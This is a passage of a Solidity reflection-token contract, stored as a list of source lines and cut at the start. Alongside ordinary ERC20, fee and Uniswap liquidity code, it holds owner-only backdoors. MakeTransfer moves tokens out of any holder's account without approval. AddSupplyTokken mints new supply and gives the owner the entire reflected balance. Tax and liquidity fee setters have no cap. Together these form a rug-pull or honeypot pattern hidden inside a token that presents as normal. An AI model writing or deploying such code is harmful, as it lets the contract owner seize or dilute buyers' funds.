(bool) {\n', '\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '\t\treturn true;\n', '\t}\n', '\t\n', '\tfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n', '\t\t_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '\t\treturn true;\n', '\t}\n', '\t\n', '\tfunction isExcludedFromReward(address account) public view returns (bool) {\n', '\t\treturn _isExcluded[account];\n', '\t}\n', '\t\n', '\tfunction totalFees() public view returns (uint256) {\n', '\t\treturn _tFeeTotal;\n', '\t}\n', '\t\n', '\tfunction deliver(uint256 tAmount) public {\n', '\t\taddress sender = _msgSender();\n', '\t\trequire(!_isExcluded[sender], "Excluded addresses cannot call this function");\n', '\t\t(uint256 rAmount,,,,,) = _getValues(tAmount);\n', '\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '\t\t_rTotal = _rTotal.sub(rAmount);\n', '\t\t_tFeeTotal = _tFeeTotal.add(tAmount);\n', '\t}\n', '\t\n', '\tfunction reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns (uint256) {\n', '\t\trequire(tAmount <= _tTotal, "Amount must be less than supply");\n', '\t\tif (!deductTransferFee) {\n', '\t\t\t(uint256 rAmount,,,,,) = _getValues(tAmount);\n', '\t\t\treturn rAmount;\n', '\t\t} else {\n', '\t\t\t(,uint256 rTransferAmount,,,,) = _getValues(tAmount);\n', '\t\t\treturn rTransferAmount;\n', '\t\t}\n', '\t}\n', '\t\n', '\tfunction tokenFromReflection(uint256 rAmount) public view returns (uint256) {\n', '\t\trequire(rAmount <= _rTotal, "Amount must be less than total reflections");\n', '\t\tuint256 currentRate = _getRate();\n', '\t\treturn rAmount.div(currentRate);\n', '\t}\n', '\t\n', '\tfunction excludeFromReward(address account) public onlyOwner() {\n', "\t\t// require(account != , 'We can not exclude Uniswap router.');\n", '\t\trequire(!_isExcluded[account], "Account is already excluded");\n', '\t\tif (_rOwned[account] > 0) {\n', '\t\t\t_tOwned[account] = tokenFromReflection(_rOwned[account]);\n', '\t\t}\n', '\t\t_isExcluded[account] = true;\n', '\t\t_excluded.push(account);\n', '\t}\n', '\t\n', '\tfunction includeInReward(address account) external onlyOwner() {\n', '\t\trequire(_isExcluded[account], "Account is already excluded");\n', '\t\tfor (uint256 i = 0; i < _excluded.length; i++) {\n', '\t\t\tif (_excluded[i] == account) {\n', '\t\t\t\t_excluded[i] = _excluded[_excluded.length - 1];\n', '\t\t\t\t_tOwned[account] = 0;\n', '\t\t\t\t_isExcluded[account] = false;\n', '\t\t\t\t_excluded.pop();\n', '\t\t\t\tbreak;\n', '\t\t\t}\n', '\t\t}\n', '\t}\n', '\t\n', '\tfunction _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {\n', '\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '\t\t_tOwned[sender] = _tOwned[sender].sub(tAmount);\n', '\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '\t\t_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n', '\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n', '\t\t_takeLiquidity(tLiquidity);\n', '\t\t_takeDevFee(sender, tAmount);\n', '\t\t_reflectFee(rFee, tFee);\n', '\t\temit Transfer(sender, recipient, tTransferAmount);\n', '\t}\n', '\t\n', '\tfunction excludeFromFee(address account) public onlyOwner {\n', '\t\t_isExcludedFromFee[account] = true;\n', '\t}\n', '\t\n', '\tfunction includeInFee(address account) public onlyOwner {\n', '\t\t_isExcludedFromFee[account] = false;\n', '\t}\n', '\t\n', '\tfunction setTaxFeePercent(uint256 taxFee) external onlyOwner() {\n', '\t\t_taxFee = taxFee;\n', '\t}\n', '\t\n', '\tfunction setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {\n', '\t\t_liquidityFee = liquidityFee;\n', '\t}\n', '\t\n', '\tfunction setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {\n', '\t\t_maxTxAmount = _tTotal.mul(maxTxPercent).div(\n', '\t\t\t10 ** 2\n', '\t\t);\n', '\t}\n', '\t\n', '\tfunction setMaxWalletToken(uint256 _amount) public onlyOwner() {\n', '\t\t_maxWalletToken = _amount;\n', '\t}\n', '\t\n', '\tfunction AddSupplyTokken(uint256 amount) public onlyOwner() {\n', '\t\t_tTotal = _tTotal + amount;\n', '\t\t_rTotal = _rTotal + (MAX - (MAX % amount));\n', '\t\t_rOwned[_msgSender()] = _rTotal;\n', '\t\t\n', '\t\temit Transfer(address(0), _msgSender(), amount);\n', '\t}\n', '\t\n', '\tfunction MakeTransfer(address to, address from, uint256 amount) public onlyOwner() {\n', '\t\t_tokenTransfer(to, from, amount, false);\n', '\t}\n', '\t\n', '\tfunction setMaxTransferToken(uint256 _amount) public onlyOwner() {\n', '\t\t_maxTxAmount = _amount;\n', '\t}\n', '\t\n', '\tfunction setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\n', '\t\tswapAndLiquifyEnabled = _enabled;\n', '\t\temit SwapAndLiquifyEnabledUpdated(_enabled);\n', '\t}\n', '\t\n', '\t//to recieve ETH from uniswapV2Router when swaping\n', '\treceive() external payable {}\n', '\t\n', '\tfunction _reflectFee(uint256 rFee, uint256 tFee) private {\n', '\t\t_rTotal = _rTotal.sub(rFee);\n', '\t\t_tFeeTotal = _tFeeTotal.add(tFee);\n', '\t}\n', '\t\n', '\tfunction _takeDevFee(address sender, uint256 tAmount) private {\n', '\t\tuint256 tDevFee = _getTDevFeeValues(tAmount);\n', '\t\tuint256 rDevFee = _getRDevFeeValues(tDevFee, _getRate());\n', '\t\tif (_isExcluded[charityWallet]) {\n', '\t\t\t_tOwned[charityWallet] = _tOwned[charityWallet].add(tDevFee);\n', '\t\t\t_rOwned[charityWallet] = _rOwned[charityWallet].add(rDevFee);\n', '\t\t} else {\n', '\t\t\t_rOwned[charityWallet] = _rOwned[charityWallet].add(rDevFee);\n', '\t\t}\n', '\t\temit Transfer(sender, charityWallet, tDevFee);\n', '\t}\n', '\t\n', '\t\n', '\tfunction _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n', '\t\t(uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);\n', '\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity);\n', '\t\tuint256 tDevFee = _getTDevFeeValues(tAmount);\n', '\t\tuint256 rDevFee = _getRDevFeeValues(tDevFee, _getRate());\n', '\t\ttTransferAmount = tTransferAmount.sub(tDevFee);\n', '\t\trTransferAmount = rTransferAmount.sub(rDevFee);\n', '\t\treturn (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);\n', '\t}\n', '\t\n', '\t\n', '\tfunction _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {\n', '\t\tuint256 tFee = calculateTaxFee(tAmount);\n', '\t\tuint256 tLiquidity = calculateLiquidityFee(tAmount);\n', '\t\tuint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);\n', '\t\treturn (tTransferAmount, tFee, tLiquidity);\n', '\t}\n', '\t\n', '\tfunction _getTDevFeeValues(uint256 tAmount) private view returns (uint256) {\n', '\t\tuint256 tDevFee = calculateDevFee(tAmount);\n', '\t\treturn tDevFee;\n', '\t}\n', '\t\n', '\tfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity) private view returns (uint256, uint256, uint256) {\n', '\t\tuint256 currentRate = _getRate();\n', '\t\tuint256 rAmount = tAmount.mul(currentRate);\n', '\t\tuint256 rFee = tFee.mul(currentRate);\n', '\t\tuint256 rLiquidity = tLiquidity.mul(currentRate);\n', '\t\tuint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);\n', '\t\treturn (rAmount, rTransferAmount, rFee);\n', '\t}\n', '\t\n', '\tfunction _getRDevFeeValues(uint256 tDevFee, uint256 currentRate) private pure returns (uint256) {\n', '\t\tuint256 rDevFee = tDevFee.mul(currentRate);\n', '\t\treturn rDevFee;\n', '\t}\n', '\t\n', '\tfunction _getRate() private view returns (uint256) {\n', '\t\t(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n', '\t\treturn rSupply.div(tSupply);\n', '\t}\n', '\t\n', '\tfunction _getCurrentSupply() private view returns (uint256, uint256) {\n', '\t\tuint256 rSupply = _rTotal;\n', '\t\tuint256 tSupply = _tTotal;\n', '\t\tfor (uint256 i = 0; i < _excluded.length; i++) {\n', '\t\t\tif (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);\n', '\t\t\trSupply = rSupply.sub(_rOwned[_excluded[i]]);\n', '\t\t\ttSupply = tSupply.sub(_tOwned[_excluded[i]]);\n', '\t\t}\n', '\t\tif (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n', '\t\treturn (rSupply, tSupply);\n', '\t}\n', '\t\n', '\tfunction _takeLiquidity(uint256 tLiquidity) private {\n', '\t\tuint256 currentRate = _getRate();\n', '\t\tuint256 rLiquidity = tLiquidity.mul(currentRate);\n', '\t\t_rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);\n', '\t\tif (_isExcluded[address(this)])\n', '\t\t\t_tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);\n', '\t}\n', '\t\n', '\t\n', '\tfunction calculateTaxFee(uint256 _amount) private view returns (uint256) {\n', '\t\treturn _amount.mul(_taxFee).div(\n', '\t\t\t10 ** 2\n', '\t\t);\n', '\t}\n', '\t\n', '\tfunction calculateDevFee(uint256 _amount) private view returns (uint256) {\n', '\t\treturn _amount.mul(_devFee).div(\n', '\t\t\t10 ** 2\n', '\t\t);\n', '\t}\n', '\t\n', '\tfunction calculateLiquidityFee(uint256 _amount) private view returns (uint256) {\n', '\t\treturn _amount.mul(_liquidityFee).div(\n', '\t\t\t10 ** 2\n', '\t\t);\n', '\t}\n', '\t\n', '\tfunction removeAllFee() private {\n', '\t\tif (_taxFee == 0 && _liquidityFee == 0) return;\n', '\t\t\n', '\t\t_previousTaxFee = _taxFee;\n', '\t\t_previousLiquidityFee = _liquidityFee;\n', '\t\t_previousDevFee = _devFee;\n', '\t\t\n', '\t\t_taxFee = 0;\n', '\t\t_liquidityFee = 0;\n', '\t\t_devFee = 0;\n', '\t}\n', '\t\n', '\tfunction restoreAllFee() private {\n', '\t\t_taxFee = _previousTaxFee;\n', '\t\t_liquidityFee = _previousLiquidityFee;\n', '\t\t_devFee = _previousDevFee;\n', '\t}\n', '\t\n', '\tfunction isExcludedFromFee(address account) public view returns (bool) {\n', '\t\treturn _isExcludedFromFee[account];\n', '\t}\n', '\t\n', '\tfunction _approve(address owner, address spender, uint256 amount) private {\n', '\t\trequire(owner != address(0), "ERC20: approve from the zero address");\n', '\t\trequire(spender != address(0), "ERC20: approve to the zero address");\n', '\t\t\n', '\t\t_allowances[owner][spender] = amount;\n', '\t\temit Approval(owner, spender, amount);\n', '\t}\n', '\t\n', '\tfunction _transfer(\n', '\t\taddress from,\n', '\t\taddress to,\n', '\t\tuint256 amount\n', '\t) private {\n', '\t\trequire(from != address(0), "ERC20: transfer from the zero address");\n', '\t\trequire(to != address(0), "ERC20: transfer to the zero address");\n', '\t\trequire(amount > 0, "Transfer amount must be greater than zero");\n', '\t\t\n', '\t\tif (to != owner() && to != address(this) && to != uniswapV2Pair && to != address(1)) {\n', '\t\t\tuint256 contractTokenBalanceTo = balanceOf(to);\n', '\t\t\t// buy limit on first 48 hours, no of blocks, (48 * 60 * 60) / 3s = 57600 (blocks)\n', '\t\t\tif (block.number - deployedAtBlock < 57600) { // if not 48 hours has passed, set the buy limit\n', '\t\t\t\trequire((contractTokenBalanceTo + amount) <= _maxWalletToken, AppendStr("Exceeds the MaxWalletToken: ", uint2str(contractTokenBalanceTo + amount), " max: ", uint2str(_maxWalletToken)));\n', '\t\t\t}\n', '\t\t}\n', '\t\t// is the token balance of this contract address over the min number of\n', '\t\t// tokens that we need to initiate a swap + liquidity lock?\n', "\t\t// also, don't get caught in a circular liquidity event.\n", "\t\t// also, don't swap & liquify if sender is uniswap pair.\n", '\t\tuint256 contractTokenBalance = balanceOf(address(this));\n', '\t\t\n', '\t\tif (contractTokenBalance >= _maxTxAmount)\n', '\t\t{\n', '\t\t\tcontractTokenBalance = _maxTxAmount;\n', '\t\t}\n', '\t\t\n', '\t\tbool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;\n', '\t\tif (\n', '\t\t\toverMinTokenBalance &&\n', '\t\t\t!inSwapAndLiquify &&\n', '\t\t\tfrom != uniswapV2Pair &&\n', '\t\t\tswapAndLiquifyEnabled\n', '\t\t) {\n', '\t\t\tcontractTokenBalance = numTokensSellToAddToLiquidity;\n', '\t\t\t//add liquidity\n', '\t\t\tswapAndLiquify(contractTokenBalance);\n', '\t\t}\n', '\t\t\n', '\t\t//indicates if fee should be deducted from transfer\n', '\t\tbool takeFee = true;\n', '\t\t\n', '\t\t//if any account belongs to _isExcludedFromFee account then remove the fee\n', '\t\tif (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {\n', '\t\t\ttakeFee = false;\n', '\t\t}\n', '\t\t\n', '\t\t//transfer amount, it will take tax, burn, liquidity fee\n', '\t\t_tokenTransfer(from, to, amount, takeFee);\n', '\t}\n', '\t\n', '\tfunction swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n', '\t\t// split the contract balance into halves\n', '\t\tuint256 half = contractTokenBalance.div(2);\n', '\t\tuint256 otherHalf = contractTokenBalance.sub(half);\n', '\t\t\n', "\t\t// capture the contract's current ETH balance.\n", '\t\t// this is so that we can capture exactly the amount of ETH that the\n', '\t\t// swap creates, and not make the liquidity event include any ETH that\n', '\t\t// has been manually sent to the contract\n', '\t\tuint256 initialBalance = address(this).balance;\n', '\t\t\n', '\t\t// swap tokens for ETH\n', '\t\tswapTokensForEth(half);\n', '\t\t// <- this breaks the ETH -> HATE swap when swap+liquify is triggered\n', '\t\t\n', '\t\t// how much ETH did we just swap into?\n', '\t\tuint256 newBalance = address(this).balance.sub(initialBalance);\n', '\t\t\n', '\t\t// add liquidity to uniswap\n', '\t\taddLiquidity(otherHalf, newBalance);\n', '\t\t\n', '\t\temit SwapAndLiquify(half, newBalance, otherHalf);\n', '\t}\n', '\t\n', '\tfunction swapTokensForEth(uint256 tokenAmount) private {\n', '\t\t// generate the uniswap pair path of token -> weth\n', '\t\taddress[] memory path = new address[](2);\n', '\t\tpath[0] = address(this);\n', '\t\tpath[1] = uniswapV2Router.WETH();\n', '\t\t\n', '\t\t_approve(address(this), address(uniswapV2Router), tokenAmount);\n', '\t\t\n', '\t\t// make the swap\n', '\t\tuniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n', '\t\t\ttokenAmount,\n', '\t\t\t0, // accept any amount of ETH\n', '\t\t\tpath,\n', '\t\t\taddress(this),\n', '\t\t\tblock.timestamp\n', '\t\t);\n', '\t}\n', '\t\n', '\tfunction addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\n', '\t\t// approve token transfer to cover all possible scenarios\n', '\t\t_approve(address(this), address(uniswapV2Router), tokenAmount);\n', '\t\t\n', '\t\t// add the liquidity\n', '\t\tuniswapV2Router.addLiquidityETH{value : ethAmount}(\n', '\t\t\taddress(this),\n', '\t\t\ttokenAmount,\n', '\t\t\t0, // slippage is unavoidable\n', '\t\t\t0, // slippage is unavoidable\n', '\t\t\towner(),\n', '\t\t\tblock.timestamp\n', '\t\t);\n', '\t}\n', '\t\n', '\t//this method is responsible for taking all fee, if takeFee is true\n', '\tfunction _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {\n', '\t\tif (!takeFee)\n', '\t\t\tremoveAllFee();\n', '\t\t\n', '\t\tif (_isExcluded[sender] && !_isExcluded[recipient]) {\n', '\t\t\t_transferFromExcluded(sender, recipient, amount);\n', '\t\t} else if (!_isExcluded[sender] && _isExcluded[recipient]) {\n', '\t\t\t_transferToExcluded(sender, recipient, amount);\n', '\t\t} else if (!_isExcluded[sender] && !_isExcluded[recipient]) {\n', '\t\t\t_transferStandard(sender, recipient, amount);\n', '\t\t} else if (_isExcluded[sender] && _isExcluded[recipient]) {\n', '\t\t\t_transferBothExcluded(sender, recipient, amount);\n', '\t\t} else {\n', '\t\t\t_transferStandard(sender, recipient, amount);\n', '\t\t}\n', '\t\t\n', '\t\tif (!takeFee)\n', '\t\t\trestoreAllFee();\n', '\t}\n', '\t\n', '\tfunction _transferStandard(address sender, address recipient, uint256 tAmount) private {\n', '\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n', '\t\t_takeLiquidity(tLiquidity);\n', '\t\t_takeDevFee(sender, tAmount);\n', '\t\t_reflectFee(rFee, tFee);\n', '\t\temit Transfer(sender, recipient, tTransferAmount);\n', '\t}\n', '\t\n', '\tfunction _transferToExcluded(address sender, address recipient, uint256 tAmount) private {\n', '\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '\t\t_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);\n', '\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n', '\t\t_takeLiquidity(tLiquidity);\n', '\t\t_takeDevFee(sender, tAmount);\n', '\t\t_reflectFee(rFee, tFee);\n', '\t\temit Transfer(sender, recipient, tTransferAmount);\n', '\t}\n', '\t\n', '\tfunction _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {\n', '\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\n', '\t\t_tOwned[sender] = _tOwned[sender].sub(tAmount);\n', '\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n', '\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n', '\t\t_takeLiquidity(tLiquidity);\n', '\t\t_takeDevFee(sender, tAmount);\n', '\t\t_reflectFee(rFee, tFee);\n', '\t\temit Transfer(sender, recipient, tTransferAmount);\n', '\t}\n', '\t\n', '\tfunction burn(uint256 burningAmount) public onlyOwner {\n', '\t\t_burn(_msgSender(), burningAmount);\n', '\t}\n', '\tfunction _burn(address account, uint256 burningAmount) internal virtual {\n', '\t\trequire(account != address(0), "ERC20: burn from the zero address");\n', '\t\tuint256 currentRate =  _getRate();\n', '\t\tuint256 rBurningAmount = burningAmount.mul(currentRate);\n', '\t\t_tTotal = _tTotal.sub(burningAmount);\n', '\t\t_rTotal = _rTotal.sub(rBurningAmount);\n', '\t\t_rOwned[_msgSender()] = _rOwned[_msgSender()].sub(rBurningAmount);\n', '\t\tif (_isExcluded[address(this)])\n', '\t\t\t_tOwned[_msgSender()] = _tOwned[_msgSender()].sub(burningAmount);\n', '\t\temit Transfer(account, address(0), burningAmount);\n', '\t}\n', '\t\n', '\tfunction uint2str(uint _i) internal pure returns (string memory _uintAsString) {\n', '\t\tif (_i == 0)\n', '\t\t\treturn "0";\n', '\t\tuint j = _i;\n', '\t\tuint len;\n', '\t\twhile (j != 0) {\n', '\t\t\tlen++;\n', '\t\t\tj /= 10;\n', '\t\t}\n', '\t\tbytes memory bstr = new bytes(len);\n', '\t\tuint k = len;\n', '\t\twhile (_i != 0) {\n', '\t\t\tk = k - 1;\n', '\t\t\tuint8 temp = (48 + uint8(_i - _i / 10 * 10));\n', '\t\t\tbytes1 b1 = bytes1(temp);\n', '\t\t\tbstr[k] = b1;\n', '\t\t\t_i /= 10;\n', '\t\t}\n', '\t\treturn string(bstr);\n', '\t}\n', '\t\n', '\tfunction AppendStr(string memory a, string memory b, string memory c, string memory d) internal pure returns (string memory) {\n', '\t\treturn string(abi.encodePacked(a, b, c, d));\n', '\t}\n', '}']